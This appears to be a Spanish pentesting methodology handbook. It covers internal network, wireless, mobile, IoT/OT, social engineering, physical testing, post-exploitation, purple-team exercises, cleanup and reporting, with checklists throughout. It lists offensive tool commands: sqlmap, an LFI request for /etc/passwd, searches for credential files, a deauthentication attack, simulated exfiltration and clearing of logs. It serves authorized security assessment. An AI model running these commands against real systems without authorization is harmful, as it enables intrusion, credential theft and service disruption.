echo "Evaluación de configuraciones seguras y acceso" >> 06_cloud/saas.txt

Revisar configuraciones de compartición, roles, MFA, políticas DLP

Validar endpoints, logs, alertas y retención de datos sensibles

6.9 Evidencias y coordinación con equipo cloud

echo "Documentación de hallazgos, logs y capturas de pantalla" >> 06_cloud/evidencias.txt

Registrar outputs de todos los comandos, JSONs, capturas de consola y screenshots

Coordinar hallazgos críticos con el equipo cloud del cliente para mitigación inmediata

Checklist final del Punto 6:

echo "[ ] Descubrimiento de activos públicos
[ ] Identidades y permisos revisados
[ ] Datos cifrados y versionados
[ ] Compute y serverless evaluados
[ ] Redes y perímetros comprobados
[ ] Contenedores y orquestación revisados
[ ] CI/CD y registries evaluados
[ ] SaaS configuraciones y acceso revisado
[ ] Evidencias archivadas y coordinadas" > 06_cloud/checklist_punto6.txt

Resultado esperado:

echo "Mapa completo de seguridad cloud, exposición crítica identificada, permisos y datos revisados, hallazgos documentados para mitigación autorizada" >> 06_cloud/resultado_punto6.txt

PUNTO 7 — Red Interna (Assumed-Breach o acceso controlado)

Objetivo: Evaluar la seguridad interna de la red bajo condiciones controladas, incluyendo descubrimiento de servicios, saltos entre subredes, AD/LDAP y exposición de secretos, con autorización expresa y seguimiento seguro.

7.1 Handover/control de entrada

mkdir -p 07_red_interna

echo "Recepción de credenciales temporales y bastión" >> 07_red_interna/handover.txt

Conexión segura al bastión: ssh usuario@bastion -i clave.pem -A

Confirmación de VLANs permitidas, IPs asignadas y restricciones

7.2 Descubrimiento de red seguro

echo "Mapeo de hosts internos y servicios" >> 07_red_interna/descubrimiento.txt

nmap: nmap -sS -p- -T4 10.0.0.0/24 -oN 07_red_interna/nmap_hosts.txt

ping sweep: fping -a -g 10.0.0.0/24 >> 07_red_interna/ping_sweep.txt

SNMP scan (si autorizado): snmpwalk -v2c -c public 10.0.0.1

Netdiscover/ARP scan: netdiscover -r 10.0.0.0/24

7.3 Servicios internos críticos

echo "Enumeración de AD/LDAP, SMB/NFS, bases de datos, RDP/VDI" >> 07_red_interna/servicios.txt

SMB: smbclient -L //IP -U usuario; enum4linux -a IP >> 07_red_interna/smb_enum.txt

LDAP: ldapsearch -x -h IP -b "dc=dominio,dc=com" >> 07_red_interna/ldap_enum.txt

Kerberos: klist; krb5.conf revisión; enum4linux también reporta tickets

Bases de datos: mysql -h IP -u usuario -p; psql -h IP -U usuario

RDP: rdesktop IP; verificar acceso y banners

7.4 Segmentación y salto entre subredes

echo "Pruebas de segmentación, firewall internos y jump hosts" >> 07_red_interna/segmentacion.txt

Proxychains y pivoting con SSH: ssh -L 1080:target:3389 user@bastion

Metasploit / Responder / CrackMapExec para validar saltos y credenciales reutilizables (solo entorno controlado)

Documentar VLAN, ACLs, posibles bypass de segmentación

7.5 Visión de Active Directory

echo "Estructura, GPOs, trusts y hygiene de AD" >> 07_red_interna/ad.txt

BloodHound (en entorno autorizado): neo4j + SharpHound ingesta de AD

Enumeración con PowerView: Get-NetUser, Get-NetComputer, Get-NetGroup

Revisar GPOs críticos: auditoría de passwords, privilegios locales, trusts externos

Reportar problemas de hygiene: SPNs mal configurados, cuentas inactivas, grupos de privilegio excesivos

7.6 Revisiones de configuraciones y secretos internos

echo "Compartidos, credenciales y configuraciones críticas" >> 07_red_interna/secretos.txt

Revisar shares SMB/NFS con permisos: smbmap -H IP

Búsqueda de archivos sensibles: find / -type f -iname "password" -exec ls -lh {} ;

PowerShell: Get-ChildItem -Path C:\ -Include *.config, *.key, *.env -Recurse

7.7 Priorización de objetivos internos y plan de pruebas por oleadas

echo "Planificación de pruebas según criticidad y riesgo" >> 07_red_interna/plan_oleadas.txt

Categorizar sistemas: AD, bases de datos, aplicaciones críticas, workstations

Establecer orden de pruebas y ventanas de intrusión controlada

Checklist final del Punto 7:

echo "[ ] Credenciales y bastión verificadas
[ ] Descubrimiento de hosts y servicios completado
[ ] Servicios internos enumerados
[ ] Segmentación y saltos evaluados
[ ] AD/LDAP auditado
[ ] Configuraciones críticas y secretos revisados
[ ] Plan de pruebas por oleadas definido" > 07_red_interna/checklist_punto7.txt

Resultado esperado:

echo "Mapa completo de la red interna, servicios críticos, AD/LDAP, segmentación y exposición de secretos, hallazgos documentados para mitigación autorizada" >> 07_red_interna/resultado_punto7.txt

PUNTO 8 — Wireless & Radio

Objetivo: Evaluar la seguridad de redes inalámbricas y radios (Wi-Fi, BLE, NFC, RFID) bajo condiciones controladas y con autorización, sin interrumpir servicios críticos.

8.1 Política y alcance de pruebas

mkdir -p 08_wireless_radio

echo "Redes y dispositivos autorizados para pruebas: SSIDs, BLE devices, NFC tags" >> 08_wireless_radio/alcance.txt

Confirmar límites: no atacar redes externas, no saturar el espectro, respetar clientes legítimos

8.2 Reconocimiento pasivo y cobertura

echo "Captura de SSID y señal sin autenticarse" >> 08_wireless_radio/recon_pasivo.txt

airodump-ng wlan0mon --write 08_wireless_radio/airodump_output

Kismet: kismet -c wlan0mon -o 08_wireless_radio/kismet_capture

mapeo de cobertura: crear tabla de potencia de señal por ubicación

8.3 Configuración de seguridad Wi-Fi

echo "Revisión de WPA2/WPA3, EAP, autenticación y aislamiento de clientes" >> 08_wireless_radio/wifi_seguridad.txt

Verificar cifrado: iwlist wlan0 scan | grep Encryption

Analizar clientes conectados y APs: arp-scan -l

Revisar aislamiento de clientes: ping entre hosts conectados

8.4 Redes de invitados, portales cautivos y segmentación

echo "Evaluación de segmentación y accesos de invitados" >> 08_wireless_radio/guest_networks.txt

Captura de portal cautivo: curl -I http://IP_portal

Comprobación de VLAN separadas y reglas de firewall: nmap -Pn 192.168.X.0/24

Verificación de que clientes invitados no acceden a la red corporativa

8.5 BLE/NFC/RFID: perfiles, emparejamientos y autorizaciones

echo "Revisión de dispositivos BLE autorizados y tags NFC/RFID" >> 08_wireless_radio/ble_nfc.txt

BLE scanning: hcitool lescan; gatttool -b MAC -I

NFC reading (si autorizado): nfc-list; nfc-poll

Comprobación de permisos y emparejamientos para evitar acceso no autorizado

8.6 Pruebas de resiliencia y registros

echo "Pruebas coordinadas para resiliencia y logging" >> 08_wireless_radio/resiliencia.txt

Test de deautenticación simulada (solo entorno controlado y autorizado): aireplay-ng --deauth 1 -a AP_MAC wlan0mon

Monitorizar logs del AP: tail -f /var/log/syslog | grep wlan0

Validar alertas generadas y tolerancia de red sin impactar usuarios

Checklist final del Punto 8:

echo "[ ] Alcance y dispositivos autorizados definidos
[ ] Recon pasivo completado
[ ] Seguridad Wi-Fi revisada
[ ] Red de invitados y portales evaluados
[ ] BLE/NFC/RFID auditados
[ ] Pruebas de resiliencia coordinadas y registradas" > 08_wireless_radio/checklist_punto8.txt

Resultado esperado:

echo "Mapa completo de redes inalámbricas y dispositivos radio, seguridad evaluada, segmentación verificada, hallazgos documentados y evidencias listas para mitigación" >> 08_wireless_radio/resultado_punto8.txt

PUNTO 9 — Móvil (Android/iOS)

Objetivo: Evaluar la seguridad de aplicaciones y dispositivos móviles bajo un entorno autorizado, sin comprometer datos reales de usuarios finales.

9.1 Análisis estático

mkdir -p 09_movil

echo "Inspección de APK/IPA sin ejecución, permisos, almacenamiento, secretos, hardening" >> 09_movil/analisis_estatico.txt

Android: apktool d app.apk -o 09_movil/apktool_out

Revisar permisos: aapt dump permissions app.apk

Buscar secretos en código: grep -R "API_KEY|SECRET|TOKEN" 09_movil/apktool_out

iOS: class-dump /path/to/app.app > 09_movil/ios_classes.txt

9.2 Análisis dinámico

echo "Pruebas de tráfico y hooking en entorno controlado" >> 09_movil/analisis_dinamico.txt

Configurar proxy intercept: Burp Suite, mitmproxy

Android: Frida + Objection

frida -U -f com.app.target -l 09_movil/hook.js --no-pause

iOS (jailbreak o test environment): frida -U -n AppName -l 09_movil/hook_ios.js

Monitorizar llamadas a APIs, almacenamiento local, logs, certificados SSL/TLS

9.3 APIs móviles y sincronización con backend

echo "Pruebas de endpoints móviles" >> 09_movil/apis.txt

Revisión de autenticación, autorización y rate-limits: curl -v https://api.app.com/resource

Verificación de cifrado y exposición de tokens

Pruebas de manipulación de parámetros y bypass de lógica de negocio

9.4 Integración con proveedores

echo "Evaluación de push, analytics, pagos y servicios de terceros" >> 09_movil/integraciones.txt

Revisar configuración de Firebase, Google/Apple Push, SDKs de terceros

Validar tokens y claves de servicio (sólo en entorno autorizado)

Pruebas de acceso a datos compartidos entre apps

9.5 Gestión corporativa / MDM y pérdida de dispositivo

echo "Pruebas de gestión de dispositivos y políticas MDM" >> 09_movil/mdm.txt

Comprobar políticas de cifrado y bloqueo remoto

Simular escenario de pérdida de dispositivo en laboratorio: bloqueo, borrado seguro, autenticación requerida

Validar logs de gestión centralizada y alertas generadas

Checklist final del Punto 9:

echo "[ ] Análisis estático completo
[ ] Análisis dinámico realizado con proxy/hooking
[ ] APIs y backend auditados
[ ] Integraciones con proveedores evaluadas
[ ] Gestión corporativa y MDM verificada" > 09_movil/checklist_punto9.txt

Resultado esperado:

echo "Mapa completo de riesgos móviles, aplicaciones analizadas, endpoints y tokens auditados, hallazgos documentados y evidencia lista para remediación" >> 09_movil/resultado_punto9.txt

PUNTO 10 — IoT / OT / Hardware

Objetivo: Evaluar la seguridad de dispositivos IoT, sistemas OT y hardware autorizado, respetando los límites de integridad física y datos sensibles.

10.1 Inventario y topología

mkdir -p 10_iot_ot

echo "Registrar todos los dispositivos, interfaces, dependencias y límites de seguridad" >> 10_iot_ot/inventario.txt

Enumerar dispositivos conectados: nmap -sP 192.168.X.0/24

Identificar servicios expuestos: nmap -sV -p- 192.168.X.Y

10.2 Interfaz y firmware

echo "Análisis de interfaces (web, telnet, SSH, serial) y firmware en entorno autorizado" >> 10_iot_ot/firmware.txt

Descargar firmware seguro: wget http://vendor.com/fw.bin -P 10_iot_ot/

Extraer y analizar firmware: binwalk -e fw.bin

Revisar configuración: grep -R "password|key|token" 10_iot_ot/_fw_extracted

Documentar hallazgos sin alterar firmware original

10.3 Protocolos industriales y dependencias

echo "Evaluación de protocolos industriales (Modbus, OPC-UA, BACnet) y comunicación segura" >> 10_iot_ot/protocolos.txt

Escaneo seguro de puertos ICS: nmap -sV -p502,44818 192.168.X.Y

Revisar credenciales predeterminadas y configuraciones inseguras

No ejecutar comandos destructivos, solo pruebas de descubrimiento

10.4 Actualizaciones, arranque seguro y cadena de suministro

echo "Validación de procesos de actualización y arranque seguro" >> 10_iot_ot/actualizaciones.txt

Verificar firma de firmware: openssl dgst -sha256 -verify vendor_pubkey.pem -signature fw.sig fw.bin

Documentar procedimientos de actualización y vulnerabilidades conocidas

Registrar hallazgos de supply chain: bibliotecas externas, certificados y dependencias

Checklist final del Punto 10:

echo "[ ] Inventario y topología completa
[ ] Firmware analizado sin modificación
[ ] Protocolos industriales revisados
[ ] Procedimientos de actualización y arranque seguro verificados" > 10_iot_ot/checklist_punto10.txt

Resultado esperado:

echo "Mapa completo de riesgos de IoT/OT/Hardware, interfaces y firmware auditados, protocolos revisados, evidencia lista para remediación" >> 10_iot_ot/resultado_punto10.txt

PUNTO 11 — Ingeniería Social

Objetivo: Evaluar la seguridad humana dentro del alcance autorizado, sin comprometer la integridad ni la privacidad de personas externas al alcance.

11.1 Alcance, mensajes legales y “do-not-target list”

mkdir -p 11_ingenieria_social

echo "Definir claramente el alcance de la prueba: usuarios, departamentos, tipos de ataque permitidos" >> 11_ingenieria_social/alcance.txt

Registrar lista de exclusión: usuarios, VIPs, datos sensibles

Crear plantillas de mensajes legales: aviso de prueba o disclaimers internos

11.2 Tipologías de ataque (alto nivel)

echo "Simulaciones permitidas: vishing, smishing, phishing, pretexting" >> 11_ingenieria_social/tipos.txt

Preparar emails/sms simulados con herramientas como:

GoPhish: gophish -f usuarios.csv -t plantilla

SET (Social Engineering Toolkit): setoolkit

Realizar llamadas de prueba controladas (“vishing”) solo con guion aprobado

11.3 Métricas de concienciación y coordinación con RRHH/Legal

echo "Registrar clics en enlaces, envíos de credenciales, reportes internos" >> 11_ingenieria_social/metricas.txt

Mantener logs de incidentes simulados, sin exfiltrar información real

Informar periódicamente a RRHH y Legal de resultados, sin exponer datos sensibles

11.4 Red Team ejercicios controlados con “safewords”

echo "Definir señales de parada inmediata (safewords) para suspender cualquier actividad" >> 11_ingenieria_social/safewords.txt

Simular escenarios combinando técnicas físicas, digitales y sociales solo en alcance autorizado

Registrar hallazgos de vulnerabilidad humana y plan de concienciación

Checklist final del Punto 11:

echo "[ ] Alcance y límites definidos
[ ] Mensajes y simulaciones preparados
[ ] Métricas y resultados documentados
[ ] Safewords establecidos y comunicados" > 11_ingenieria_social/checklist_punto11.txt

Resultado esperado:

echo "Mapa completo de riesgos humanos, hallazgos documentados, métricas de concienciación listas para plan de mejora" >> 11_ingenieria_social/resultado_punto11.txt

PUNTO 12 — Physical

Objetivo: Evaluar la seguridad física y los controles de acceso dentro del alcance autorizado, sin comprometer la integridad de personas ni dañar activos.

12.1 Aprobaciones, seguridades y acompañamiento

mkdir -p 12_physical

echo "Confirmar autorización por escrito para pruebas físicas, incluyendo alcance, horarios y responsables de seguridad" >> 12_physical/aprobaciones.txt

Coordinar acompañamiento de personal de seguridad interno (si es requerido)

Registrar todos los accesos y permisos otorgados para la prueba

12.2 Observación de controles: accesos, CCTV, guardias, visitor flow (alto nivel)

echo "Mapear puntos de entrada/salida, turnos de guardias, ubicaciones de CCTV y rutas de visitantes" >> 12_physical/observacion.txt

Registrar horarios de patrullas, protocolos de seguridad y procedimientos de visitantes

Documentar cualquier debilidad observada sin manipular sistemas ni equipos

12.3 Validación de políticas (sin forzar cerraduras ni dañar activos)

echo "Revisar políticas de control de acceso, etiquetas de seguridad y procedimientos de emergencia" >> 12_physical/politicas.txt

Verificar cumplimiento de procedimientos de autenticación física (badges, biometría, llaves)

Simular escenarios de acceso autorizado con credenciales ficticias o temporales aprobadas

Registrar hallazgos y recomendaciones de mejora

Checklist final del Punto 12:

echo "[ ] Aprobaciones y autorizaciones confirmadas
[ ] Observación de controles completada
[ ] Políticas revisadas y validadas
[ ] Hallazgos documentados y plan de mejora listo" > 12_physical/checklist_punto12.txt

Resultado esperado:

echo "Informe de seguridad física completo, riesgos identificados, cumplimiento de políticas verificado, recomendaciones listas para plan de acción" >> 12_physical/resultado_punto12.txt

PUNTO 13 — Post-Exposición (Data Handling & Impacto)

Objetivo: Gestionar de forma responsable los hallazgos de la auditoría, demostrando impacto mínimo y protegiendo la información sensible.

13.1 Validación responsable de hallazgos

mkdir -p 13_post_exposicion

echo "Revisar cada hallazgo antes de explotación: confirmar alcance, riesgo y autorización" >> 13_post_exposicion/validacion.txt

Ejecutar pruebas de explotación controladas solo en entornos autorizados (sandbox, VM, laboratorio)

Evitar exfiltración de datos reales; generar datos de prueba si es necesario

13.2 Demostración de impacto controlado (pruebas mínimas, entorno seguro)

echo "Realizar PoC en entornos aislados: screenshots, logs, capturas de comandos" >> 13_post_exposicion/poc.txt

Ejemplos:

SQL injection: sqlmap -u http://target/page.php?id=1 --dbs --batch --tamper=space2comment

LFI: curl http://target/?page=../../../../etc/passwd (en laboratorio)

SSH/SMB interno: ssh -i key user@lab-machine o smbclient //host/share -U user%pass

Registrar cada comando y resultado en cuaderno de pruebas

13.3 Manejo de datos sensibles: minimización, cifrado, borrado seguro

echo "Todos los datos sensibles cifrados y protegidos" >> 13_post_exposicion/datos_sensibles.txt

Comandos recomendados:

Cifrado: gpg --symmetric --cipher-algo AES256 archivo.txt

Borrado seguro: shred -u archivo.txt

Logs y outputs: tar czf evidencias.tar.gz 13_post_exposicion/* && gpg --symmetric evidencias.tar.gz

13.4 Coordinación inmediata ante hallazgos críticos (stop-test)

echo "Si se encuentra vulnerabilidad crítica, detener pruebas y alertar al responsable del cliente" >> 13_post_exposicion/alertas.txt

Definir contactos de emergencia: SOC, IT manager, CISO

Mantener comunicación segura (Signal, correo cifrado, portal interno)

Checklist final del Punto 13:

echo "[ ] Validación de hallazgos completada
[ ] PoC documentada y controlada
[ ] Datos sensibles cifrados y eliminados
[ ] Alertas críticas gestionadas y reportadas" > 13_post_exposicion/checklist_punto13.txt

Resultado esperado:

echo "Informe post-exposición completo con impacto mínimo, hallazgos validados, datos sensibles protegidos, alertas críticas gestionadas" >> 13_post_exposicion/resultado_punto13.txt

PUNTO 14 — Resiliencia, Detección y Respuesta (Purple Team)

Objetivo: Evaluar la capacidad de detección y respuesta del cliente, integrando hallazgos del pentest con ejercicios controlados de Blue Team y telemetría.

14.1 Mapeo de técnicas a MITRE ATT&CK

mkdir -p 14_purple_team

echo "Relacionar hallazgos y técnicas explotadas con MITRE ATT&CK" >> 14_purple_team/mapping.txt

Ejemplo de comando para generar mapa rápido:

echo "Técnica: T1078, Técnica: T1059, Técnica: T1210" >> 14_purple_team/mapping.txt

Clasificar por fase: Recon, Initial Access, Execution, Persistence, Lateral Movement, Exfiltration

14.2 Señales de detección, reglas y telemetría

Revisar logs de SIEM, EDR y alertas activas

echo "Registrar indicadores de compromiso y reglas de detección sugeridas" >> 14_purple_team/deteccion.txt

Ejemplos:

Nmap scan detectado: revisar logs firewall/IDS (cat /var/log/snort/alert)

Intentos de LFI/SQLi en web: correlacionar con WAF o logs Apache/Nginx

PowerShell o scripts maliciosos: Get-EventLog -LogName Security | Where-Object { $_.Message -match "Invoke-WebRequest" }

14.3 Ejercicios controlados con Blue Team

Programar escenarios: simulación de lateral movement, exfiltración de datos dummy, escalada de privilegios

echo "Escenarios de prueba y resultados documentados" >> 14_purple_team/exercises.txt

Comandos y acciones controladas:

Crear archivo dummy: echo "Dummy Data" > exfil_test.txt

Simular exfiltración: scp exfil_test.txt user@jump-box:/tmp/

Validar alertas generadas en SIEM y revisar tiempos de detección

14.4 Validación de telemetría y respuesta

Comparar alertas generadas con la actividad ejecutada en laboratorio

Registrar gaps: echo "Gap detectado: no se alertó de acceso SSH desde host externo" >> 14_purple_team/gaps.txt

Recomendar reglas adicionales: correlaciones de logs, alertas proactivas

Checklist final del Punto 14:

echo "[ ] Técnicas mapeadas a MITRE ATT&CK
[ ] Indicadores de detección documentados
[ ] Escenarios de prueba ejecutados
[ ] Gaps de telemetría identificados
[ ] Recomendaciones de reglas sugeridas" > 14_purple_team/checklist_punto14.txt

Resultado esperado:

echo "Cobertura Purple Team completa: detección validada, gaps documentados, alertas ajustadas y recomendadas" >> 14_purple_team/resultado_punto14.txt

PUNTO 15 — Limpieza y Restauración

Objetivo: Garantizar que todos los cambios temporales del pentest sean revertidos, eliminando artefactos y dejando el entorno exactamente como estaba antes de la auditoría.

15.1 Reversión de cambios temporales

Restaurar archivos modificados:

cp 00_preparacion/backups/* /ruta_original/

Validar integridad: diff /ruta_original/ /ruta_backup/

Eliminar usuarios o credenciales temporales creados:

userdel -r usuario_temp

rm -rf /home/usuario_temp

15.2 Eliminación de artefactos de prueba

Borrar scripts, payloads y exploits utilizados:

rm -rf /pentest/tools/tmp_payloads/

shred -u /pentest/tools/exploits/* (shred para borrado seguro)

Limpiar logs generados durante pruebas si no forman parte de la evidencia final:

> /var/log/test_activity.log

15.3 Verificación conjunta con el cliente

Coordinar con NOC/SOC para validar que sistemas, servicios y usuarios vuelvan a estado normal

echo "Checklist de limpieza validada por cliente" >> 15_limpieza/verificacion.txt

Comandos de validación de servicios:

HTTP: curl -I http://IP

SSH: ssh usuario@IP exit

Bases de datos: mysql -u root -p -e "SHOW DATABASES;"

Checklist final del Punto 15:

echo "[ ] Cambios temporales revertidos
[ ] Artefactos eliminados
[ ] Credenciales temporales borradas
[ ] Logs revisados y minimizados
[ ] Verificación conjunta con cliente completada" > 15_limpieza/checklist_punto15.txt

Resultado esperado:

echo "Entorno restaurado a estado original, sin rastro de pruebas intrusivas ni artefactos de pentest, validado por cliente y equipo de auditoría" >> 15_limpieza/resultado_punto15.txt

PUNTO 16 — Reporte y Remediación

Objetivo: Documentar hallazgos, riesgos, evidencias y recomendaciones de manera clara, profesional y accionable para el cliente. Todo el material debe ser verificable, trazable y priorizado según impacto.

16.1 Estructura del informe

Secciones principales:

Resumen ejecutivo: impacto global y hallazgos críticos.

Detalle técnico: pruebas realizadas, comandos, outputs relevantes.

Evidencias: hashes, screenshots, logs, dumps.

Riesgos: CVSS/NIST, severidad y probabilidad.

Recomendaciones: acciones correctivas, mitigaciones, remediaciones rápidas y estratégicas.

Formato sugerido: Markdown o Word/LibreOffice.

Guardar versión final con timestamp:

cp informe_draft.md 16_reporte/informe_final_$(date +%Y%m%d_%H%M).md

16.2 Recomendaciones priorizadas

Clasificación de hallazgos: crítico, alto, medio, bajo.

Asociar recomendaciones con severidad y facilidad de mitigación:

Ejemplo comando:

echo "Crítico: SQL Injection en /login — Mitigación: parametrizar queries y validar inputs" >> 16_reporte/recomendaciones.txt

echo "Alto: WAF no configurado correctamente — Mitigación: revisar reglas y políticas de filtrado" >> 16_reporte/recomendaciones.txt

Incluir evidencia y pasos de validación de la recomendación.

16.3 Reunión de cierre y plan de retest

Coordinar reunión con stakeholders (TI, seguridad, dirección) para explicar hallazgos y recomendaciones.

Definir fecha y alcance de retest:

echo "Reunión cierre: $(date) — Asistentes: TI, Seguridad, Auditoría" >> 16_reporte/reuniones.txt

echo "Retest planificado para: YYYY-MM-DD" >> 16_reporte/reuniones.txt

Confirmar aceptación de recomendaciones y compromisos de acción por el cliente.

Checklist final del Punto 16:

echo "[ ] Informe técnico completado y revisado
[ ] Evidencias vinculadas y trazables
[ ] Recomendaciones priorizadas y accionables
[ ] Reunión de cierre realizada
[ ] Plan de retest definido" > 16_reporte/checklist_punto16.txt

Resultado esperado:

echo "Cliente cuenta con informe profesional completo, evidencia verificada y plan de remediación con prioridades claras y fechas de seguimiento" >> 16_reporte/resultado_punto16.txt

PUNTO 17 — Retest y Verificación de Fixes

Objetivo: Validar que las medidas correctivas aplicadas por el cliente solucionan los hallazgos identificados, asegurando que no quedan vulnerabilidades residuales y que no se introducen nuevos riesgos.

17.1 Validación de medidas aplicadas

Revisar los sistemas remediados: puertos cerrados, servicios parcheados, configuraciones actualizadas.

Confirmar que los hallazgos previos ya no son explotables:

Comandos de prueba:

Para web: curl -v https://objetivo.com/login + payloads de test de inyección SQL/XSS.

Para servicios: nmap -sV -pPUERTOS IP para verificar versiones corregidas.

Para AD/LDAP: ldapsearch -x -H ldap://IP -b "dc=dominio,dc=com" verificando accesos.

Ejecutar scripts de validación interna o automatizados del laboratorio:

python3 verify_fixes.py --targets IP --report 17_retest/resultado_verificacion.txt

17.2 Evidencias post-remediación

Captura de resultados de pruebas: logs, screenshots, outputs de comandos.

Comparar evidencia anterior vs. actual:

diff 16_reporte/evidencias_previas.txt 17_retest/evidencias_actuales.txt > 17_retest/diff_verificacion.txt

Guardar evidencia cifrada:

gpg --symmetric --cipher-algo AES256 17_retest/diff_verificacion.txt

17.3 Actualización de riesgos

Revisar matriz de riesgos con resultados del retest: ajustar CVSS/NIST según estado actual.

Registrar hallazgos remediados vs. hallazgos persistentes:

echo "Hallazgos remediados:" > 17_retest/estado_riesgos.txt

echo "Hallazgos persistentes:" >> 17_retest/estado_riesgos.txt

Informar al cliente sobre cambios en la priorización y próximos pasos.

Checklist final del Punto 17:

echo "[ ] Todas las vulnerabilidades previas verificadas
[ ] Evidencias post-remediación documentadas y cifradas
[ ] Riesgos actualizados y priorizados
[ ] Cliente informado sobre estado de fixes y hallazgos persistentes" > 17_retest/checklist_punto17.txt

Resultado esperado:

echo "Se confirma que las medidas aplicadas corrigen los hallazgos detectados, la evidencia queda trazada, y los riesgos se actualizan según el estado actual de la infraestructura" >> 17_retest/resultado_punto17.txt

PUNTO 18 — Lecciones Aprendidas y Mejora Continua

Objetivo: Registrar y analizar los hallazgos, éxitos y fallos durante la auditoría, con el fin de mejorar procesos, herramientas y preparación para futuros pentestings.

18.1 Retroalimentación con stakeholders

Reunión de cierre con todos los actores: cliente, Blue Team, SOC/NOC, responsables de TI.

Presentar hallazgos, evidencias, mitigaciones aplicadas y recomendaciones estratégicas.

Recolectar feedback sobre claridad, alcance, impacto y procesos de comunicación.

Documentar en archivo:

echo "Fecha,Participantes,Feedback,Acciones recomendadas" > 18_lecciones/feedback_stakeholders.csv

18.2 Actualización de playbooks y baselines

Incorporar aprendizajes técnicos en playbooks de pruebas futuras:

Nuevos vectores de ataque detectados.

Procedimientos de validación de fixes más eficientes.

Mejoras en generación y almacenamiento de evidencias.

Actualizar plantillas de checklists y documentación:

cp 18_lecciones/playbook_base.txt 18_lecciones/playbook_actualizado.txt

echo "Incorporadas nuevas técnicas y escenarios del pentest actual" >> 18_lecciones/playbook_actualizado.txt

18.3 Roadmap de madurez de seguridad

Evaluar la madurez del cliente según hallazgos: infraestructura, aplicaciones, cloud, procesos, respuesta a incidentes.

Crear plan de mejora progresivo: corto, medio y largo plazo.

Registrar métricas de evolución:

echo "Control,Estado inicial,Estado final,Prioridad" > 18_lecciones/madurez_seguridad.csv

echo "Firewall,Configuración básica,Optimizada,Alta" >> 18_lecciones/madurez_seguridad.csv

Proponer ejercicios de Purple Team, simulaciones, retests periódicos y auditorías de seguimiento.

Checklist final del Punto 18:

echo "[ ] Feedback stakeholders documentado
[ ] Playbooks y checklists actualizados
[ ] Roadmap de madurez de seguridad creado
[ ] Métricas y plan de seguimiento definidos" > 18_lecciones/checklist_punto18.txt

Resultado esperado:

echo "Se cierra la auditoría con documentación completa, aprendizajes incorporados, procesos optimizados y roadmap de mejora continua listo para futuras pruebas y auditorías" >> 18_lecciones/resultado_punto18.txt

PUNTO 19 — Apéndices

Objetivo: Proveer herramientas, plantillas y referencias que permitan estandarizar, acelerar y documentar todas las fases de pentesting. Todo contenido es reutilizable para auditorías futuras.

A. Checklists por dominio

Externo / Internet-Facing:

Descubrimiento de hosts, escaneo de puertos, fingerprinting de servicios, TLS, WAF/CDN, quick wins.

Web / API:

Mapas de rutas, autenticación, control de acceso, inyecciones, subida de ficheros, CSRF/XSS, lógica de negocio, privacidad, integraciones externas.

Cloud:

Descubrimiento de activos, permisos IAM, cifrado de datos, serverless, redes, contenedores, CI/CD, SaaS.

Red interna:

Handover seguro, descubrimiento de red, AD/LDAP/Kerberos, segmentación, GPOs, exposición de secretos.

Móvil:

Análisis estático y dinámico, APIs, sincronización, gestión MDM, pérdidas de dispositivo.

Wireless:

Cobertura, configuraciones WPA2/3, portales cautivos, BLE/NFC/RFID.

IoT/OT/Hardware:

Inventario, interfaces, firmware, protocolos, arranque seguro, supply chain.

Ingeniería Social:

Alcance definido, tipos de ataque controlados, métricas, safewords.

Physical:

Observación de accesos, CCTV, controles de seguridad, políticas sin dañar activos.

B. Matrices de cobertura

OWASP ASVS / Top10:

Mapear pruebas a vulnerabilidades conocidas y riesgos.

WSTG: Web Security Testing Guide (OWASP).

PTES: Penetration Testing Execution Standard.

NIST 800-115: Guía de pruebas técnicas de seguridad.

ISO 27001 / CIS / ATT&CK: Matrices de controles, detección y mitigación.

C. Plantillas

Cuaderno de pruebas:

Fecha, objetivo, comando, resultado, evidencia, notas.

Registro de evidencias:

Timestamps, hashes, ubicación, descripción, capturas.

Informe ejecutivo / técnico:

Resumen, hallazgos críticos, mitigaciones, plan de remediación, evidencias anexas.

D. Tabla de severidades y priorización

Crítica: Explotación remota fácil, acceso total a datos sensibles.

Alta: Acceso parcial a sistemas críticos, datos confidenciales.

Media: Acceso limitado o riesgo mitigable, impacto operativo bajo.

Baja: Hallazgos informativos, mejoras recomendadas, riesgo mínimo.

Ejemplo de registro:

echo "Vulnerabilidad,Severidad,Impacto,Probabilidad,Prioridad" > 19_apendices/severidades.csv

echo "SQL Injection,Crítica,Acceso total BD,Alta,1" >> 19_apendices/severidades.csv

E. Glosario y referencias

Glosario de términos técnicos: OSINT, Enumeration, Exploit, CVE, CVSS, IAM, RBAC, API, WAF, CSP, TLS, RDP, SSH, MFA, SSO, Kerberos, AD, VLAN, NACL, SG, CI/CD, MDM, IoT, OT, RF, BLE, NFC.

Referencias y lecturas recomendadas:

OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

NIST 800-115: https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf

MITRE ATT&CK: https://attack.mitre.org/

PTES Standard: http://www.pentest-standard.org/index.php/Main_Page

CIS Benchmarks: https://www.cisecurity.org/cis-benchmarks/

Checklist final del Punto 19:

echo "[ ] Checklists por dominio creados y actualizados
[ ] Matrices de cobertura integradas
[ ] Plantillas revisadas y listas
[ ] Severidades y priorización definidas
[ ] Glosario completo y referencias registradas" > 19_apendices/checklist_punto19.txt

Resultado esperado:

echo "Todas las herramientas de documentación, plantillas y referencias están disponibles para soporte de auditorías futuras, asegurando estandarización, trazabilidad y aprendizaje continuo" >> 19_apendices/resultado_punto19.txt


---------------------------------------------------
---------------------------------------------------
Manual Pentesting Extremo - Laboratorio / CTF Legal - Versión Brutal
0. Gobierno, Legalidad y Seguridad Operacional

echo "Contrato revisado, alcance, limitaciones, ventanas de prueba, firmas cliente" > 00_preparacion/autorizaciones.txt
echo "ROE: solo pruebas autorizadas, alertar ante incidentes críticos" > 00_preparacion/roe.txt
echo "SOC contacto: soc@cliente.com, kill-switch activo, canales seguros" > 00_preparacion/comunicacion.txt
mkdir -p 00_preparacion/backups
cp /ruta/importante/* 00_preparacion/backups/
echo "Rollback listo ante cualquier interrupción" > 00_preparacion/backups/plan.txt
find . -type f -exec sha256sum {} ; >> 00_preparacion/evidencias_hash.txt
echo "Fecha,Hora,Accion,Comando,Resultado" > 00_preparacion/evidencias.csv
gpg --symmetric --cipher-algo AES256 00_preparacion/evidencias.csv
export SECRET_PASS="valor_super_secreto"
echo $SECRET_PASS | gpg --symmetric --cipher-algo AES256 > 00_preparacion/secret.gpg

1. Preparación de Entorno Avanzado
VMs, contenedores, segmentación, VPN, jump-box
Roles: caja negra / gris / blanca
